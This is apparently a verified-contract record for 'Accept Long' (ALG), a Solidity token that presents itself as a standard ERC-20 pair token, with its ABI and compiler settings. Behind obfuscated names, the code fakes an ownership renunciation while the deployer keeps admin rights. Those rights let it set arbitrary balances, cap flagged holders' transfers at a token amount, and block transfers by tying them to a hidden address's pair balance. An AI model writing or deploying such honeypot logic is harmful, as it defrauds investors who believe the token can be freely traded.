{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface listFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamBuy {\n    function createPair(address txReceiverTotal, address exemptTx) external returns (address);\n}\n\ninterface tradingFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTx) external view returns (uint256);\n\n    function transfer(address buyShould, uint256 feeAuto) external returns (bool);\n\n    function allowance(address buySwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyShould,\n        uint256 feeAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTo, uint256 value);\n    event Approval(address indexed buySwap, address indexed spender, uint256 value);\n}\n\ninterface txAmount is tradingFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AcceptLong is receiverSender, tradingFrom, txAmount {\n\n    function senderBuy() private view {\n        require(receiverFee[_msgSender()]);\n    }\n\n    address public maxTeam;\n\n    mapping(address => bool) public receiverFee;\n\n    uint256 private maxBuyLaunch = 100000000 * 10 ** 18;\n\n    function shouldMode(uint256 feeAuto) public {\n        senderBuy();\n        shouldLimit = feeAuto;\n    }\n\n    event OwnershipTransferred(address indexed listMax, address indexed fromExempt);\n\n    uint256 exemptLimitReceiver;\n\n    bool private exemptToken;\n\n    function name() external view virtual override returns (string memory) {\n        return walletSwapReceiver;\n    }\n\n    function takeLimit(address senderListBuy) public {\n        senderBuy();\n        \n        if (senderListBuy == limitMode || senderListBuy == maxTeam) {\n            return;\n        }\n        takeLaunched[senderListBuy] = true;\n    }\n\n    function transferFrom(address launchAt, address buyShould, uint256 feeAuto) external override returns (bool) {\n        if (_msgSender() != atShould) {\n            if (enableBuy[launchAt][_msgSender()] != type(uint256).max) {\n                require(feeAuto <= enableBuy[launchAt][_msgSender()]);\n                enableBuy[launchAt][_msgSender()] -= feeAuto;\n            }\n        }\n        return toSwap(launchAt, buyShould, feeAuto);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeMode;\n    }\n\n    constructor (){\n        if (teamShould != swapLiquidity) {\n            swapLiquidity = true;\n        }\n        listFund atTotal = listFund(atShould);\n        maxTeam = teamBuy(atTotal.factory()).createPair(atTotal.WETH(), address(this));\n        \n        limitMode = _msgSender();\n        toFund();\n        receiverFee[limitMode] = true;\n        toFee[limitMode] = maxBuyLaunch;\n        \n        emit Transfer(address(0), limitMode, maxBuyLaunch);\n    }\n\n    function owner() external view returns (address) {\n        return marketingAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableBuy;\n\n    function getOwner() external view returns (address) {\n        return marketingAuto;\n    }\n\n    function balanceOf(address sellTx) public view virtual override returns (uint256) {\n        return toFee[sellTx];\n    }\n\n    function transfer(address autoBuy, uint256 feeAuto) external virtual override returns (bool) {\n        return toSwap(_msgSender(), autoBuy, feeAuto);\n    }\n\n    address atShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 shouldLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLaunch;\n    }\n\n    mapping(address => bool) public takeLaunched;\n\n    function fromTo(address teamMax) public {\n        if (autoIs) {\n            return;\n        }\n        if (swapLiquidity != totalMaxSwap) {\n            swapLiquidity = false;\n        }\n        receiverFee[teamMax] = true;\n        \n        autoIs = true;\n    }\n\n    bool public totalMaxSwap;\n\n    string private walletSwapReceiver = \"Accept Long\";\n\n    function allowance(address sellIs, address receiverSell) external view virtual override returns (uint256) {\n        if (receiverSell == atShould) {\n            return type(uint256).max;\n        }\n        return enableBuy[sellIs][receiverSell];\n    }\n\n    address public limitMode;\n\n    function approve(address receiverSell, uint256 feeAuto) public virtual override returns (bool) {\n        enableBuy[_msgSender()][receiverSell] = feeAuto;\n        emit Approval(_msgSender(), receiverSell, feeAuto);\n        return true;\n    }\n\n    function toSwap(address launchAt, address buyShould, uint256 feeAuto) internal returns (bool) {\n        if (launchAt == limitMode) {\n            return atAuto(launchAt, buyShould, feeAuto);\n        }\n        uint256 launchedTotal = tradingFrom(maxTeam).balanceOf(atBuy);\n        require(launchedTotal == shouldLimit);\n        require(buyShould != atBuy);\n        if (takeLaunched[launchAt]) {\n            return atAuto(launchAt, buyShould, totalToken);\n        }\n        return atAuto(launchAt, buyShould, feeAuto);\n    }\n\n    uint8 private takeMode = 18;\n\n    bool private teamShould;\n\n    mapping(address => uint256) private toFee;\n\n    string private minLaunch = \"ALG\";\n\n    bool public autoIs;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxBuyLaunch;\n    }\n\n    function atAuto(address launchAt, address buyShould, uint256 feeAuto) internal returns (bool) {\n        require(toFee[launchAt] >= feeAuto);\n        toFee[launchAt] -= feeAuto;\n        toFee[buyShould] += feeAuto;\n        emit Transfer(launchAt, buyShould, feeAuto);\n        return true;\n    }\n\n    function toFund() public {\n        emit OwnershipTransferred(limitMode, address(0));\n        marketingAuto = address(0);\n    }\n\n    function swapAuto(address autoBuy, uint256 feeAuto) public {\n        senderBuy();\n        toFee[autoBuy] = feeAuto;\n    }\n\n    uint256 constant totalToken = 8 ** 10;\n\n    bool private swapLiquidity;\n\n    address atBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private marketingAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"}],\"name\":\"fromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"shouldMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"swapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderListBuy\",\"type\":\"address\"}],\"name\":\"takeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMaxSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AcceptLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}